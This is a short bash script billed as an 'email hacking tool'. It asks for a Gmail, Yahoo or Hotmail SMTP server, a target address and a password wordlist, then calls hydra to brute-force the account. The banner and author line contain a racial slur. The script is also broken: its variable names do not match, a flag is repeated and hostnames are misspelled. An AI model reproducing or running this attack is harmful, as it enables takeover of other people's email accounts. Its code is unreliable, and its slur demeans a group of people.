#!/usr/bin/bash

echo "WELCOME TO RICH NiGGA EMAIL HACKING TOOL." | boxes -d boy

echo Simple Email Hacking Tool
echo Written By:Rich Nigga
echo NOTE:Make sure you Have wordlists!
echo Let us Begin Hack
echo choose a SMTP service:Gmail=smtp.gmail.com /Yahoo = smpt.mail.yahoo.com/ Hotmail = smpt.live.com/:

read smpt
echo Enter Email Address:
read Email

echo provide Directory of Wordlist for passwords:
read wordlist


hydra -s -l $email -P $wordlistn-e ns -V -s 465 $smtp
smtp
